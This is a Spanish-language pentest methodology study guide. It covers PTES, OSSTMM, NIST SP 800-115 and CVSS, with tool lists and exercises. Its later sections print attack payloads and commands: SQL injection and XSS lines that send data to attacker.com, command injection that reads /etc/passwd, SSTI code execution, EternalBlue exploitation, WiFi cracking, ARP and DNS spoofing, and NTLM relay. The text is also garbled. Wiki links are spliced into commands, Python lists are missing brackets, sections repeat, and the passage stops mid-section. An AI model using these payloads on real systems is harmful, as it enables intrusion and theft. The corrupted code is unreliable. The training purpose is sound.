# P3nt3st M3th0d0l0gy — Metodologias de Pentest / Ciclo Completo
## Índice

> ⏱️ **Tiempo estimado:** 10 horas (~2 sesiones) (2487 lineas)

1. [Introducción](#introducción)
2. [PTES](#ptes)
3. [OSSTMM](#osstmm)
4. [NIST SP 800-115](#nist-sp-800-115)
5. [Ciclo Completo de Pentest](#ciclo-completo-de-pentest)
6. [CVSS 3.x](#cvss-3x)
7. [Herramientas por Fase](#herramientas-por-fase)
8. [Ejercicios Practicos](#ejercicios-practicos)
9. [Recursos](#recursos)
10. [OSSTMM](#osstmm)
11. [OWASP Testing Guide v4.2](#owasp-testing-guide-v42)
12. [NIST SP 800-115](#nist-sp-800-115)
13. [Ciclo Completo de Pentest](#ciclo-completo-de-pentest)
14. [Tipos de Pentest](#tipos-de-pentest)
15. [Reporting](#reporting)
16. [Plantillas y Deliverables](#plantillas-y-deliverables)
17. [CVSS 3.x](#cvss-3x)
18. [Herramientas por Fase](#herramientas-por-fase)
19. [Ejercicios Practicos](#ejercicios-practicos)
20. [Recursos Adicionales](#recursos-adicionales)
21. [Checklists por Fase (Resumen Rapido)](#checklists-por-fase-resumen-rapido)
22. [Glosario de Terminos](#glosario-de-terminos)
23. [Referencias Rapidas](#referencias-rapidas)
24. [Compliance y Regulaciones](#compliance-y-regulaciones)
25. [Escenarios Reales de Pentest](#escenarios-reales-de-pentest)
26. [Pentest Tools Comparison Matrix](#pentest-tools-comparison-matrix)
27. [Pentest Lab Setup](#pentest-lab-setup)
28. [Pentest Career Path](#pentest-career-path)
29. [Pentest Checklists Detalladas](#pentest-checklists-detalladas)
30. [Final Notes](#final-notes)
---
## 1. Introducción
Bienvenido a la guia mas completa de metodologias de pentesting en espanol (argentino). Aca no solo vas a aprender los frameworks, sino como aplicarlos en el mundo real.
Una metodologia de pentest no es un lujo, es una necesidad. Te da:
- Estructura: saber que hacer en cada fase
- Consistencia: no te salteas pasos importantes
- Profesionalismo: podes justificar cada accion
- Legal: te cubris con alcances definidos
- Calidad: los reportes son completos y accionables
Los principales frameworks:
- PTES: El mas practico y usado por consultoras
- OSSTMM: El mas academico y metrico
- OWASP: El estandar para aplicaciones web
- NIST SP 800-115: El marco del gobierno de EE.UU.
---

## 2. PTES — Penetration Testing Execution Standard

> [!NOTE]
> Seccion PTES pendiente de desarrollo.


## 3. OSSTMM — Open Source Security Testing Methodology Manual

OSSTMM es un enfoque mas academico y metrico del pentesting. Desarrollado por ISECOM, se enfoca en canales de comunicacion y calculo de riesgo operacional.

### 3.1. Canales de OSSTMM

OSSTMM define 5 canales de seguridad:

#### Canal 1: Human Security
Personas, empleados, contratistas, usuarios.
- Testing de ingenieria social
- Phishing, vishing, smishing
- Seguridad fisica de personal
- Background checks
- Entrenamiento de seguridad

#### Canal 2: Physical Security
Acceso fisico a instalaciones.
- Cerraduras, puertas, ventanas
- CCTV, alarmas, sensores
- Control de acceso biometrico
- Seguridad perimetral
- Proteccion de activos fisicos

#### Canal 3: Wireless Security
Redes inalambricas.
- WiFi (WEP, WPA, WPA2, WPA3)
- Bluetooth, BLE
- RFID, NFC
- Cellular (GSM, LTE, 5G)
- Satelital
- SDR (Software Defined Radio)

#### Canal 4: Telecommunications Security
Redes de telecomunicaciones.
- VoIP, SIP
- PBX, extensiones
- Modems (war dialing)
- Fax
- ISDN, DSL

#### Canal 5: Data Networks Security
Redes de datos tradicionales.
- Switches, routers, firewalls
- TCP/IP, DNS, DHCP
- VPN, IPSec, SSL/TLS
- Web applications
- Databases
- Cloud services

### 3.2. RAV Calculation (Risk Assessment Values)

OSSTMM define RAV para calcular el riesgo operacional.

#### Componentes del RAV
- **True Protection (TP)**: Lo que realmente protege
- **True Exposure (TE)**: Lo que esta expuesto
- **Limited Protection (LP)**: Proteccion limitada/parcial
- **Limited Exposure (LE)**: Exposicion limitada

#### Formula RAV
```
RAV = (TP + LP) - (TE + LE)
```

Donde valores positivos indican mejor proteccion que exposicion.

#### Metricas de OSSTMM
- **Controls**: Cantidad de controles implementados
- **Vulnerabilities**: Fallas de seguridad identificadas
- **Weaknesses**: Debilidades en los controles
- **Concerns**: Areas que requieren atencion
- **Exceptions**: Casos fuera de la norma

### 3.3. Fases del Test OSSTMM

1. **Induction**: Definir alcance, reglas, contratos
2. **Interaction**: Realizar las pruebas tecnicas
3. **Reaction**: Documentar hallazgos y reacciones
4. **Post-Interaction**: Analisis y reporte

### 3.4. Diferencias OSSTMM vs PTES

| Aspecto | OSSTMM | PTES |
|---------|--------|------|
| Enfoque | Metricas y canales | Fases operativas |
| Formato | Academico/formal | Practico/ejecutable |
| Scoring | RAV (operational) | CVSS (technical) |
| Canales | 5 canales | No limitado a canales |
| Certificacion | OPST, OPSA | No tiene certificacion propia |
| Complejidad | Alta | Media |
| Uso tipico | Auditorias formales | Consultoras de pentest |

### 3.5. Ventajas de OSSTMM
- Enfoque holistico (no solo tecnico)
- Metricas comparables entre tests
- Cobertura de seguridad fisica y humana
- Estandar internacional (ISO 27001 compatible)

### 3.6. Desventajas de OSSTMM
- Muy complejo para implementar completo
- Muchos controles que ralentizan
- Requiere certificacion para uso oficial
- Poco usado en pentests comerciales

---

## 4. NIST SP 800-115

NIST SP 800-115 es la guia tecnica del gobierno de EE.UU. para testing de seguridad.

### 4.1. Fases NIST

#### Phase 1: Planning
- Definir objetivos
- Identificar stakeholders
- Desarrollar plan de testing
- Obtener autorizacion por escrito
- Establecer reglas de engagement
- Configurar ambiente de pruebas

#### Phase 2: Discovery
Tecnicas de descubrimiento:
- **Network Discovery**: Escaneo de red, identificacion de hosts
- **System Discovery**: OS fingerprinting, servicios, versiones
- **Application Discovery**: Identificar aplicaciones, versiones, configuracion

```bash
# Network Discovery
[nmap](../raw/nm4p.md) -sn 192.168.1.0/24 -oG hosts.txt
nmap -sL 192.168.1.0/24 | grep \"Nmap scan report\"

# System Discovery
nmap -O -sV 192.168.1.0/24 -oA system-discovery
nmap --script [smb](../raw/w1nd0ws-p0st3xpl01t.md#smb)-os-discovery 192.168.1.0/24
```

#### Phase 3: Attack
- **Network Attack**: Explotacion de vulnerabilidades de red
- **System Attack**: Explotacion de vulnerabilidades de SO
- **Application Attack**: Explotacion de vulnerabilidades de aplicaciones

```bash
# Network attacks
nmap --script smb-vuln-ms17-010 -p445 192.168.1.0/24
nmap --script [http](../raw/r3d3s-f0nd4m3nt0s.md#http)-vuln-cve2017-5638 -p80,443 192.168.1.0/24
[msfconsole](../raw/m3t4spl01t.md#msfconsole) -q -x \"use [exploit](../raw/m3t4spl01t.md#exploits)/windows/smb/ms17_010_eternalblue; [set](../raw/ph1sh1ng.md#social-engineering-toolkit) RHOSTS file:targets.txt; run\"
```

#### Phase 4: Reporting
- Documentar metodologia
- Resultados por fase
- Vulnerabilidades encontradas
- Riesgos asociados
- Recomendaciones
- Evidencias

### 4.2. NIST vs OTROS

| Aspecto | NIST | PTES | OWASP |
|---------|------|------|-------|
| Enfoque | Procedimientos tecnicos | Proceso completo | Web apps |
| Nivel de detalle | Alto | Medio | Muy alto (web) |
| Adaptabilidad | General | General | Solo web |
| Gobierno | Federal (EE.UU.) | Privado | Open source |

---

## 5. Ciclo Completo de Pentest

### 5.1. Etapas del Ciclo

#### 1. Contacto Inicial
- Cliente se comunica
- Briefing inicial
- Determinar si es viable
- Reunion de alcance

#### 2. Scoping y Cotizacion
- Reunion tecnica con el cliente
- Definir IPs, rangos, aplicaciones
- Tipos de prueba (black/grey/white box)
- Timeline
- Costo
- Firmar NDA

#### 3. Rules of Engagement
- Horarios de prueba
- Contactos de emergencia
- Limites de la prueba
- Manejo de datos
- Procedimiento de escalamiento

#### 4. Preparacion
- Configurar VPS/VPN
- Preparar herramientas
- Validar accesos
- Test de conectividad

#### 5. Reconocimiento
- Passive OSINT
- Active scanning
- Enumeracion de servicios
- Mapeo de red

#### 6. Vulnerability Analysis
- Escaneo automatico (Nessus, OpenVAS)
- Pruebas manuales
- Validacion de falsos positivos
- Priorizacion

#### 7. Exploitation
- Desarrollo/ejecucion de exploits
- Validacion de acceso
- Documentacion de PoC

#### 8. Post-Exploitation
- Privilege escalation
- Lateral movement
- Persistence (si aplica)
- Data exfiltration (simulada)

#### 9. Analisis y Correlacion
- Correlacion de hallazgos
- Generacion de cadena de ataque
- Calculo de CVSS
- Priorizacion

#### 10. Reporte Preliminar
- Draft del reporte
- Revision interna
- Validacion de hallazgos

#### 11. Presentacion de Resultados
- Reunion con el cliente
- Presentacion ejecutiva
- Entrega de reportes

#### 12. Remediation
- Cliente implementa parches
- Soporte remoto (opcional)
- Preguntas y respuestas

#### 13. Re-test
- Verificacion de parches
- Nuevo escaneo
- Reporte de re-test

#### 14. Cierre
- Entrega final de reportes
- Facturacion
- Encuesta de satisfaccion
- Archivo de evidencia

### 5.2. Timeline Tipico

| Fase | Duracion estimada |
|------|-------------------|
| Scoping + Contrato | 1-2 semanas |
| Reconocimiento | 1-3 dias |
| Vulnerability Analysis | 2-5 dias |
| Exploitation | 2-5 dias |
| Post-Exploitation | 1-3 dias |
| Reporte | 3-5 dias |
| Presentacion | 1 dia |
| Re-test | 1-3 dias |
| **Total** | **2-4 semanas** |

### 5.3. Equipo Recomendado
- **Pentest Lead**: Coordina, revisa, reporta
- **Pentester 1**: Web applications
- **Pentester 2**: Network/infrastructure
- **Pentester 3**: Mobile/API/Cloud
- **Support**: Data analysis, OSINT

---

## 6. CVSS 3.x — Scoring

CVSS (Common Vulnerability Scoring System) es el estandar para calcular la severidad de vulnerabilidades.

### 6.1. Metricas Base

#### Vector de Acceso (AV)
- **N** - Network: Explotable remotamente
- **A** - Adjacent: Misma red fisica/logica
- **L** - Local: Acceso local requerido
- **P** - Physical: Acceso fisico requerido

#### Complejidad de Ataque (AC)
- **L** - Low: No se requieren condiciones especiales
- **H** - High: Condiciones especiales requeridas

#### Privilegios Requeridos (PR)
- **N** - None: Sin autenticacion
- **L** - Low: Privilegios basicos
- **H** - High: Privilegios de administrador

#### Interaccion del Usuario (UI)
- **N** - None: Sin interaccion
- **R** - Required: El usuario debe hacer algo

#### Scope (S)
- **U** - Unchanged: Afecta solo al componente vulnerable
- **C** - Changed: Afecta a otros componentes

#### Confidencialidad (C)
- **H** - High: Perdida total
- **L** - Low: Perdida parcial
- **N** - None: Sin perdida

#### Integridad (I)
- **H** - High: Perdida total
- **L** - Low: Perdida parcial/modificacion limitada
- **N** - None: Sin perdida

#### Disponibilidad (A)
- **H** - High: Perdida total
- **L** - Low: Rendimiento reducido
- **N** - None: Sin impacto

### 6.2. Calculo de CVSS

```python
import json

# Ejemplo de calculo CVSS 3.1
# Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

def calculate_cvss(av, ac, pr, ui, s, c, i, a):
    # Versiones simplificada - usar libreria oficial
    # pip install cvss
    from cvss import CVSS3
    
    vector = \"CVSS:3.1/%s/%s/%s/%s/%s/%s/%s/%s/%s\" % (
        av, ac, pr, ui, s, c, i, a)
    
    cvss = CVSS3(vector)
    return {
        \"vector\": vector,
        \"base_score\": cvss.base_score,
        \"severity\": cvss.severity,
        \"temporal_score\": cvss.temporal_score,
        \"environmental_score\": cvss.environmental_score
    }

# Uso
result = calculate_cvss(\"AV:N\", \"AC:L\", \"PR:N\", \"UI:N\", \"S:U\", \"C:H\", \"I:H\", \"A:H\")
print(\"Score:\", result[\"base_score\"], \"Severity:\", result[\"severity\"])
```

### 6.3. Severidad CVSS 3.x

| Score | Severidad |
|-------|-----------|
| 0.0 | None |
| 0.1 - 3.9 | Low |
| 4.0 - 6.9 | Medium |
| 7.0 - 8.9 | High |
| 9.0 - 10.0 | Critical |

### 6.4. Ejemplos de Vectores

- **RCE remoto sin auth**: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8 Critical)
- **XSS reflejado**: AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N (6.1 Medium)
- **LFI local**: AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (5.5 Medium)
- **DoS simple**: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (5.3 Medium)
- **Info disclosure**: AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (5.3 Medium)

### 6.5. Calculadora CVSS Online
- https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator
- https://www.first.org/cvss/calculator/3.1

---

## 7. Herramientas por Fase

### Reconocimiento
- **amass**: Subdomain discovery
- **sublist3r**: Subdomain enumeration
- **theHarvester**: Email/domain OSINT
- **maltego**: Graph-based OSINT
- **shodan**: Internet device search
- **censys**: Attack surface discovery
- **recon-ng**: Web reconnaissance framework
- **spiderfoot**: OSINT automation

### Escaneo
- **nmap**: Port scanning (el standard)
- **masscan**: Escaneo masivo (millones de puertos)
- **rustscan**: Escaneo rapido en Rust
- **zmap**: Escaneo de internet completo
- **unicornscan**: Escaneo alternativo

### Enumeracion Web
- **gobuster**: Directory/file DNS enumeration
- **ffuf**: Fuzzing web rapido
- **dirsearch**: Directory brute force
- **wfuzz**: Web fuzzing framework
- **nikto**: Web server scanner
- **wapiti**: Web vulnerability scanner
- **whatweb**: Web tech fingerprinting
- **wappalyzer**: Browser extension de tech detection

### Explotacion
- **metasploit**: Framework de exploits
- **exploit-db**: Base de datos de exploits
- **searchsploit**: Busqueda local de exploits
- **impacket**: Protocolos Windows
- **crackmapexec**: AD exploitation
- **sqlmap**: SQL injection automation
- **beef**: Browser exploitation
- **responder**: LLMNR/NBT-NS poisoning

### Post-Explotacion
- **mimikatz**: Credential dumping (Windows)
- **bloodhound**: AD attack path mapping
- **powerview**: AD enumeration PowerShell
- **linpeas**: Linux privilege escalation
- **winpeas**: Windows privilege escalation
- **chisel**: Tunneling/proxy
- **ligolo-ng**: Tunneling reverse
- **socat**: Port forwarding

### Password Cracking
- **hashcat**: GPU-based cracking
- **john**: CPU-based cracking
- **hydra**: Online brute force
- **medusa**: Parallel brute force
- **crowbar**: Brute force (SSH, VNC, RDP)
- **cewl**: Custom wordlist generator
- **crunch**: Wordlist generator
- **rule-based**: hashcat rules, john rules

### Wireless
- **aircrack-ng**: WiFi cracking suite
- **reaver**: WPS cracking
- **wifite**: Automated WiFi attack
- **kismet**: Wireless monitoring
- **bettercap**: MITM framework
- **mdk3**: WiFi DoS

### Cloud
- **pacu**: AWS exploitation framework
- **scoutsuite**: Cloud security audit
- **cloudsploit**: Cloud security scanner
- **stratus-red-team**: Granite adversary emulation
- **nimbostratus**: AWS privilege escalation

### Mobile
- **apktool**: Android APK decompilation
- **jadx**: Android decompiler
- **mobsf**: Mobile security framework
- **objection**: Mobile runtime exploration
- **frida**: Dynamic instrumentation
- **drozer**: Android security assessment

---

## 8. Ejercicios Practicos

### Ejercicio 1: SOW
Redacta un Statement of Work para un pentest externo de una aplicacion web con API REST y base de datos PostgreSQL. Incluye alcance, exclusiones, timeline, y entregables.

### Ejercicio 2: ROE
Crea Rules of Engagement para un pentest interno de 1000 hosts, con pruebas de AD, segmentacion, y web apps. Define horarios, contactos, limites, y procedimiento de emergencia.

### Ejercicio 3: Reporte Tecnico
Dado un escenario de SQL injection en login + LFI en parametro file + XSS en busqueda, redacta los 3 hallazgos con formato profesional (ID, titulo, CVSS, PoC, remediacion).

### Ejercicio 4: CVSS Calculation
Calcula el CVSS de:
- RCE con autenticacion, complejidad alta
- XSS almacenado con privilegios bajos
- LFI sin autenticacion
- DoS desde red local

### Ejercicio 5: Cadena de Ataque
Describe una cadena de ataque completa desde escaneo externo hasta AD compromise usando Bloodhound, responder, mimikatz, y pass-the-hash.

### Ejercicio 6: Scope Definition
Tienes que testear una red /16 con 500 servidores, 3 apps web, base de datos Oracle, y cloud AWS. Define el scope, priorizacion, y estimacion de tiempo.

### Ejercicio 7: OSINT Report
Realiza OSINT de un dominio real (con permiso) y genera un reporte con subdominios, emails, tecnologias, y servidores encontrados.

### Ejercicio 8: Metodologia Comparison
Compara PTES vs OWASP vs NIST para un pentest web. Que fases de cada uno aplicarian? Que herramientas usarias en cada fase?

### Ejercicio 9: Remediation Plan
Para un hallazgo de RCE critico, escribe el remediation plan con quick fix, parche permanente, verificacion, y re-test.

### Ejercicio 10: Presentacion Ejecutiva
Crea un slide deck de 5 slides para presentar a un CEO los resultados de un pentest con 3 criticos, 5 altos, 10 medios, y 20 bajos.

---

## 9. Recursos

### Frameworks y Estandares
- PTES: http://www.pentest-standard.org/
- OSSTMM: https://www.isecom.org/OSSTMM.3.pdf
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- NIST SP 800-115: https://csrc.nist.gov/publications/detail/sp/800-115/final
- MITRE ATT&CK: https://attack.mitre.org/

### Certificaciones
- OSCP (Offensive Security)
- PNPT (TCM Security)
- GPEN (SANS)
- CEH (EC-Council)
- OSWE (Web Expert)

### Libros
- The Hacker Playbook 3 (Peter Kim)
- Penetration Testing: A Hands-On Introduction (Georgia Weidman)
- Advanced Penetration Testing (Wil Allsopp)
- Red Team Field Manual (Ben Clark)
- The Web Application Hacker's Handbook

### Labs
- Hack The Box: https://hackthebox.com
- TryHackMe: https://tryhackme.com
- PentesterLab: https://pentesterlab.com
- VulnHub: https://vulnhub.com
- Proving Grounds (Offensive Security)
- CyberSecLabs: https://cyberseclabs.com

---

## 10. OSSTMM — Detalle Extendido

### 10.1. Canal Humano (Human Security)

#### Ingenieria Social
- **Phishing**: Correos falsos simulando entidades conocidas
- **Vishing**: Llamadas telefonicas fraudulentas
- **Smishing**: SMS con enlaces maliciosos
- **Pretexting**: Creacion de un escenario ficticio
- **Baiting**: Dejar dispositivos infectados (USB drops)
- **Tailgating**: Seguir a un empleado a zona restringida

#### Pruebas de Phishing
```bash
# Gophish - Framework de phishing
# 1. Configurar servidor SMTP
# 2. Crear plantilla de email
# 3. Definir landing page
# 4. Enviar campana
# 5. Tracking de clicks y credenciales

# SET (Social Engineering Toolkit)
setoolkit
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester
4) Site Cloner
URL: [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://login.ejemplo.[com](../raw/w1n-s9bsyst3ms.md#com)

# Evilginx2 (reverse proxy phishing)
evilginx2 -p config/
```

#### Metricas de Seguridad Humana
- % de empleados que caen en phishing
- Tiempo medio en reportar el phishing
- % de click en enlaces sospechosos
- Cumplimiento de politicas de seguridad

### 10.2. Canal Fisico (Physical Security)

#### Componentes a Testear
- **Perimetero**: Alambrado, murallas, portones
- **Puertas**: Cerraduras, tarjetas, biometricos
- **Ventanas**: Sensores, rejas, vidrios blindados
- **CCTV**: Camaras, cobertura, DVR/NVR
- **Alarmas**: Sensores de movimiento, de puerta/ventana
- **Control de Acceso**: Tarjetas, PIN, biometrico, guardias
- **Salas de Servidores**: Control ambiental, PDU, UPS
- **Cableado**: Patch panels, racks, tierra fisica

#### Herramientas de Testing Fisico
- Lock pick sets (rapala, tension wrenches)
- RFID cloners (Proxmark3, Flipper Zero)
- Bump keys
- Camara oculta / bodycam
- Dispositivos de rastreo (GPS trackers)
- Herramientas de bypass (shims, under-door tools)

### 10.3. Canal Inalambrico (Wireless Security)

#### WiFi Security Testing
```bash
# Monitor mode
airmon-ng start wlan0
airodump-ng wlan0mon

# Capture handshake
airodump-ng -c 11 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon

# Deauth (forzar handshake)
aireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX wlan0mon

# Crack WPA2
[aircrack-ng](../raw/w1f1-4tt4cks.md#aircrack-ng) -w rockyou.txt capture-01.cap
[hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat) -m 2500 capture.hccapx rockyou.txt

# WPS attack
[reaver](../raw/w1f1-4tt4cks.md#reaver) -i wlan0mon -b XX:XX:XX:XX:XX:XX -vv
bully wlan0mon -b XX:XX:XX:XX:XX:XX

# Evil Twin
airbase-ng -e \"FreeWiFi\" -c 11 wlan0mon
# + DHCP + DNS + captive portal

# PMKID attack
hcxdumptool -i wlan0mon -o capture.pcapng -t 60
hcxpcaptool -z pmkid.txt capture.pcapng
hashcat -m 16800 pmkid.txt rockyou.txt
```

#### Bluetooth/BLE Testing
```bash
# Bluetooth scanning
hcitool scan
hcitool lescan
bluetoothctl scan on

# BLE enumeration
gatttool -b XX:XX:XX:XX:XX:XX -I
[bettercap](../raw/m1tm-m0b1l3.md#bettercap) > ble.[recon](../raw/0s1nt.md#reconocimiento) on
bettercap > ble.show

# BlueBorne check
nmap --script bluetooth-vuln-* -sV
```

### 10.4. Canal Telecomunicaciones (Telecommunications)

#### VoIP Testing
```bash
# SIP enumeration
svmap 192.168.1.0/24
svcrack -u 1000 -r 100-200 192.168.1.1
nmap -sU -p 5060,5061 192.168.1.0/24

# SIP Vicious
sipvicious_svmap.py 192.168.1.0/24
sipvicious_svwar.py -e 100-200 192.168.1.1
sipvicious_svcrack.py -u 100 -d passwords.txt 192.168.1.1

# Voice phishing (vishing)
# Usar Twilio, Asterisk o software similar
```

#### PBX Testing
```bash
# Default credentials
admin:admin, admin:pass, root:root

# Remote admin access
nmap -sV -p 23,22,80,443,4443,8080 192.168.1.0/24

# Extension enumeration
nmap --script sip-enum-users -sU -p 5060 192.168.1.1
```

### 10.5. Canal Redes de Datos (Data Networks)

#### Network Infrastructure Testing
```bash
# Switch attack
# VLAN hopping
# Double tagging
# CDP/LDP enumeration

# DHCP starvation
yersinia -G
# Interactivo: DHCP -> DHCP starvation

# ARP spoof
ettercap -T -M [arp](../raw/r3d3s-f0nd4m3nt0s.md#arp):remote /192.168.1.1/ /192.168.1.100/

# STP attack
yersinia -G
# Interactivo: STP -> become root bridge

# VTP attack
yersinia -G
# Interactivo: VTP -> inject VTP advertisement
```

#### Firewall Testing
```bash
# Firewall detection
nmap -sA -p 80 192.168.1.1
nmap -sW -p 80 192.168.1.1

# IDS/IPS evasion
nmap -D RND:10 192.168.1.1
nmap -f -p 80 192.168.1.1
nmap --mtu 32 -p 80 192.168.1.1
nmap --data-length 100 -p 80 192.168.1.1

# Firewall rule enumeration
nmap --script [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls)-bypass
nmap --script http-open-[proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) -p 80
```

### 10.6. RAV Calculation — Ejemplo Practico

```python
# RAV Calculation Example
def calcular_rav(controles, vulnerabilidades, debilidades):
    # Valores tipicos basados en OSSTMM
    tp = sum(c['peso'] for c in controles if c['tipo'] == 'protectivo')
    lp = sum(c['peso'] for c in controles if c['tipo'] == 'limitado')
    te = sum(v['peso'] for v in vulnerabilidades)
    le = sum(d['peso'] for d in debilidades)
    
    rav = (tp + lp) - (te + le)
    riesgo = rav / (tp + lp + te + le + 1) * 100
    
    return {
        'true_protection': tp,
        'limited_protection': lp,
        'true_exposure': te,
        'limited_exposure': le,
        'rav': rav,
        'risk_percentage': riesgo,
        'risk_level': 'BAJO' if riesgo < 30 else 'MEDIO' if riesgo < 60 else 'ALTO'
    }

# Ejemplo
controles = 
    {'nombre': 'Firewall', 'tipo': 'protectivo', 'peso': 8},
    {'nombre': 'Antivirus', 'tipo': 'protectivo', 'peso': 6},
    {'nombre': '[[ids](../raw/s3c-f0nd4m3nt0s.md#ids-ips))/[ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips)', 'tipo': 'limitado', 'peso': 4}
]
vulnerabilidades = 
    {'nombre': 'Puertos abiertos', 'peso': 5},
    {'nombre': '[[ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)) debil', 'peso': 3}
]
debilidades = [
    {'nombre': 'Parches faltantes', 'peso': 4}
]

resultado = calcular_rav(controles, vulnerabilidades, debilidades)
print(\"RAV:\", resultado['rav'], \"Risk:\", resultado['risk_percentage'], \"%\")
print(\"Nivel:\", resultado['risk_level'])
```
---

## 11. OWASP Testing Guide v4.2 — Detalle Extendido

### 11.1. WSTG-INPV: Input Validation — Deep Dive

#### SQL Injection Avanzado

```sql
-- Time-based detection
; WAITFOR DELAY "00:00:05"--
; OR IF(1=1, SLEEP(5), 0)--

-- Union-based extraction
; UNION SELECT null, table_name, null FROM information_schema.tables--
; UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name="users"--
; UNION SELECT null, username, password FROM users--

-- Blind [sql injection](../raw/w3b-h4ck1ng.md#sql-injection)
; AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)="a"--
; AND 1=1--

-- Out-of-band (OOB)
; EXEC master..xp_dirtree "\\\\attacker.com\\share"--
; UNION SELECT LOAD_FILE("\\\\attacker.com\\share\\test")--
```

```bash
# SQLMap avanzado
[sqlmap](../raw/w3b-h4ck1ng.md#sqlmap) -u "https://ejemplo.com/page?id=1" --batch --level=5 --risk=3 --random-agent
sqlmap -u "https://ejemplo.com/login" --data="user=admin&pass=test" --batch --level=3
sqlmap -r request.txt --batch --os-shell --dbms=mssql

# Bypass WAF
sqlmap -u "https://ejemplo.com/page?id=1" --tamper=space2comment --batch
sqlmap -u "https://ejemplo.com/page?id=1" --tamper=between,randomcase --batch
sqlmap --list-tampers

# Comandos utiles
sqlmap -u "https://ejemplo.com/page?id=1" --batch --dbs
sqlmap -u "https://ejemplo.com/page?id=1" --batch -D db --tables
sqlmap -u "https://ejemplo.com/page?id=1" --batch -D db -T users --columns
sqlmap -u "https://ejemplo.com/page?id=1" --batch -D db -T users --dump
```

#### XSS (Cross-Site Scripting) Detallado

```javascript
// Reflected [xss](../raw/w3b-h4ck1ng.md#xss)
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

// Stored XSS
// Se guarda en DB y se ejecuta cuando otros acceden

// DOM-based XSS
#<script>alert(1)</script>
javascript:alert(1)

// Blind XSS
<script src="https://attacker.com/steal.js"></script>
<img src="https://attacker.com/xss/COOKIE">
```

```bash
# XSS automation
dalfox url https://ejemplo.com/search?q=test -b https://attacker.com/xsshunter
xsstrike -u "https://ejemplo.com/search?q=test" --crawl
```

#### Command Injection

```bash
# Basic detection
; id
| id
$(id)
`id`

# Out-of-band detection
; nslookup attacker.com
| curl http://attacker.com/test

# Blind
; sleep 5
| ping -c 10 127.0.0.1

# Bypass
%0a id
;echo YWRtaW4= | base64 -d
| {cmd} 2>&1

# File ops
; cat /etc/passwd
| find / -name "*.txt"
; ls -la /
```

#### SSTI (Server-Side Template Injection)

`````python
# Jinja2 (Python - Flask)
{{7*7}}
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Freemarker (Java)
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }

# Smarty (PHP)
{$smarty.version}
{system("id")}
```

### 11.2. WSTG-BUSLOGIC: Business Logic

#### Race Conditions
`````python
# Aplicar cupon multiple veces
# Registrar mismo usuario simultaneamente
# Transferir fondos durante verificacion

# Burp Suite Turbo Intruder
"""
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=20,
                          requestsPerConnection=1)
    for i in range(100):
        engine.queue(target.req)
"""
```

#### Parameter Manipulation
```http
# Mass assignment
{"user": "test", "role": "admin", "isAdmin": true}

# Price manipulation
{"items":[{"id":1,"qty":1,"price":0.01}],"total":0.01}

# Quantity overflow
{"productId":1,"quantity":-1}
{"productId":1,"quantity":99999999}
```

### 11.3. WSTG-CLIENT: Client-side

#### CORS Testing
```bash
curl -H "Origin: https://evil.com" -I https://ejemplo.com/api
curl -H "Origin: null" -I https://ejemplo.com/api
curl -H "Origin: https://ejemplo.com.evil.com" -I https://ejemplo.com/api
```

#### WebSockets
```javascript
// WebSocket hijacking test
// Page: var ws = new WebSocket('wss://ejemplo.com/ws');
// ws.onmessage = function(e) { ... };

// wscat -c wss://ejemplo.com/ws
```

---

## 12. NIST SP 800-115 — Detalle Extendido

### 12.1. Planning Phase

#### Security Assessment Plan (SAP)
- Proposito del assessment
- Alcance y objetivos
- Roles y responsabilidades
- Cronograma detallado
- Aprobaciones firmadas

### 12.2. Discovery Phase

#### Network Topology Discovery
```bash
# Layer 2 discovery
arp-scan -l --interface eth0
arping -c 1 192.168.1.1
netdiscover -r 192.168.1.0/24

# Layer 3 discovery
traceroute 8.8.8.8
tracepath 8.8.8.8

# SNMP discovery
snmpwalk -v2c -c public 192.168.1.1
snmp-check 192.168.1.1 -c public
onesixtyone -c community.txt -i ips.txt
```

#### Service Discovery
```bash
# Full port scan
nmap -p- -T4 -A -oA full_scan 192.168.1.0/24

# Service version detection
nmap -sV --version-intensity 9 -p 21,22,23,25,53,80,110,143,443,445 192.168.1.0/24

# Web service discovery
nmap -p 80,443,8080,8443 -sV --script http-title,http-server-header 192.168.1.0/24

# Database discovery
nmap -p 1433,1521,3306,5432,6379,27017 -sV 192.168.1.0/24
```

### 12.3. Attack Phase — Deep Dive

#### Network Attack Techniques
```bash
# MITM attacks
ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.100/
bettercap -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on; net.sniff on"

# DNS spoofing (with ettercap)
# Edit /etc/ettercap/etter.dns:
# *.ejemplo.com A 192.168.1.200
# www.ejemplo.com A 192.168.1.200
ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.100/ -P dns_spoof

# SMB relay attack
impacket-ntlmrelayx -tf targets.txt -smb2support
# Responder + NTLMRelayx combo
[responder](../raw/w1nd0ws-p0st3xpl01t.md#responder) -I eth0 -dw
impacket-ntlmrelayx -tf targets.txt -smb2support

# RDP man-in-the-middle
# Usar Seth o RDP-MITM
python3 Seth.py -h
```

#### System Attack Techniques
```bash
# Linux kernel exploit
# Check kernel version
uname -a
# Search for exploit
searchsploit linux [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) 5.x
linux-exploit-suggester.sh
# Dirty Pipe (CVE-2022-0847)
